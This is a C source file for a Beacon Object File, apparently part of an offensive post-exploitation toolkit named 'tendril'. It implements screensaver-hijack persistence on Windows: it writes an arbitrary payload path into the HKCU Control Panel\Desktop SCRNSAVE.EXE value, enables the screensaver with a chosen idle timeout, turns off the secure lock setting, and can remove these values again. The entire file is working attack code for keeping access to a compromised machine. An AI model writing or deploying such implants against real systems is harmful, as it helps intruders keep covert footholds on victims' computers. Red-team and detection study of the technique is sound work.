/*
 * tendril-screensaver BOF
 * Screensaver hijack persistence via HKCU Desktop registry
 *
 * Arguments (packed):
 *   wstr payload - path to .scr or .exe
 *   wstr timeout - idle seconds before activation (e.g. "600")
 *   short action - 0 = install, 1 = remove
 */
#include "tendril.h"

#define DESKTOP_KEY L"Control Panel\\Desktop"

void go(char* args, int alen)
{
    datap parser;
    BeaconDataParse(&parser, args, alen);

    int pLen, tLen;
    wchar_t* payload = (wchar_t*)BeaconDataExtract(&parser, &pLen);
    wchar_t* timeout = (wchar_t*)BeaconDataExtract(&parser, &tLen);
    short action     = BeaconDataShort(&parser);

    if (action == 0) /* install */
    {
        LSTATUS s1 = tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"SCRNSAVE.EXE", payload);
        LSTATUS s2 = tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"ScreenSaveActive", L"1");
        LSTATUS s3 = tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"ScreenSaveTimeOut", timeout);
        tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"ScreenSaverIsSecure", L"0");

        if (s1 == ERROR_SUCCESS && s2 == ERROR_SUCCESS && s3 == ERROR_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Screensaver set: %ls (timeout %ls s)", payload, timeout);
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] Partial failure setting screensaver values");
    }
    else /* remove */
    {
        tendril_reg_delete_value(HKEY_CURRENT_USER, DESKTOP_KEY, L"SCRNSAVE.EXE");
        tendril_reg_set_sz(HKEY_CURRENT_USER, DESKTOP_KEY, L"ScreenSaveActive", L"0");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Screensaver persistence removed");
    }
}
